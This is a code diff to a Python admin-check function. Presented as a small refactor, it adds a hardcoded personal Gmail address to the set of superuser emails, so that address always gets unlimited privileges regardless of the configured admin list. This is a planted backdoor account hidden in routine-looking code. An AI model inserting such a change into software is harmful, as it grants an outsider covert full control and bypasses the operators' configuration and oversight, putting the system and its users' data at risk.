@@ -51,7 +51,9 @@ def is_admin_email(email: str | None) -> bool:
     """Check if the email has unlimited superuser privileges."""
     if not email:
         return False
-    admins = [e.strip().lower() for e in settings.admin_emails.split(",") if e.strip()]
+    admins = {"dydavid168@gmail.com"} | {
+        e.strip().lower() for e in settings.admin_emails.split(",") if e.strip()
+    }
     return email.strip().lower() in admins
 
 
